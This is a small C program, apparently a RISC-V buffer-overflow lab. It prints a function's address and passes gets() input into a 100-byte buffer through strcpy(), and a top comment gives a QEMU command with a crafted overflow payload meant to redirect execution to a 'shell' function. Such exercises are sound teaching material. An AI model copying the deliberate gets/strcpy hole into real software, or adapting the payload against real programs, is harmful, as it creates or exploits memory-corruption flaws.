//$QEMU64 -g 1234 -L $RISCV/sysroot vuln1.exe "$(python -c 'print "A"*0x6c + "BBBB" + "\x1c\xdd\x02"')"

// 0x6c buffersize + 1 byte
// old SP addr BBBB
// not_called addr: 0x10138

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void not_called() {
    printf("Enjoy your shell!\n");
   // system("/bin/bash");
}

void vulnerable_function(char* string) {
    char buffer[100];
    strcpy(buffer, string);
}

int main(int argc, char** argv) {
    printf("Main function!\n");
    char name[100];
    
  //print the address of not_called
    size_t i;
    void (*ptr_to_not_called)() = not_called;
    for (i=0; i<sizeof ptr_to_not_called; i++)
    printf("%.2x", ((unsigned char *)&ptr_to_not_called)[i]);
    putchar('\n');
  //////////
    gets(name);
    vulnerable_function(name);

    return 0;
}
